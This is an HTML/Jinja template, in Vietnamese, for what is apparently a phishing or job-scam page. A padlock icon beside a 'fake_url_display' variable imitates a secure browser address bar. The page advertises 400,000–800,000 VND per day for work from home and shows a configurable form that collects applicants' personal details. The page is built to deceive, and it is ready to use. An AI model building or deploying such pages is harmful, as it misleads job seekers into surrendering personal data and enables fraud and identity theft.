<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ data.form_title }}</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #eaeff2; margin: 0; display: flex; justify-content: center; padding: 40px 10px; }
        .wrapper { background: white; width: 100%; max-width: 600px; border-radius: 10px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.05); }
        .hero { background: #c62828; color: white; padding: 30px; text-align: center; }
        .hero h1 { margin: 0; font-size: 24px; }
        .hero p { margin: 10px 0 0; font-size: 16px; opacity: 0.9; }
        .url-bar { background: #f8f9fa; padding: 10px; text-align: center; font-family: monospace; color: #666; font-size: 13px; border-bottom: 1px solid #ddd; }
        form { padding: 30px; }
        .form-group { margin-bottom: 20px; }
        .form-group label { display: block; margin-bottom: 8px; font-weight: 600; color: #333; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #ced4da; border-radius: 6px; box-sizing: border-box; font-size: 15px; }
        .btn-submit { width: 100%; padding: 15px; background-color: #28a745; color: white; border: none; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; text-transform: uppercase; }
        .btn-submit:hover { background-color: #218838; }
    </style>
</head>
<body>
    <div class="wrapper">
        <div class="url-bar">🔒 {{ data.fake_url_display }}</div>
        <div class="hero">
            <h1>{{ data.title }}</h1>
            <p>Thu nhập 400.000đ - 800.000đ / Ngày. Làm việc linh hoạt tại nhà.</p>
        </div>
        <form method="POST" onsubmit="return validateForm()">
            {% for field in data.inputs %}
            <div class="form-group">
                <label>{{ field.name }}</label>
                <input type="{{ field.type }}" name="field_{{ loop.index0 }}" id="field_{{ loop.index0 }}" required placeholder="Nhập {{ field.name|lower }}">
                <input type="hidden" id="pattern_{{ loop.index0 }}" value="{{ field.pattern }}">
                <input type="hidden" id="msg_{{ loop.index0 }}" value="{{ field.msg }}">
            </div>
            {% endfor %}
            <button type="submit" class="btn-submit">ĐĂNG KÝ ỨNG TUYỂN</button>
        </form>
    </div>

    <script>
        function validateForm() {
            {% for field in data.inputs %}
            var val = document.getElementById("field_{{ loop.index0 }}").value;
            var pattern = new RegExp(document.getElementById("pattern_{{ loop.index0 }}").value);
            if (!pattern.test(val)) {
                alert(document.getElementById("msg_{{ loop.index0 }}").value);
                return false;
            }
            {% endfor %}
            return true;
        }
    </script>
</body>
</html>
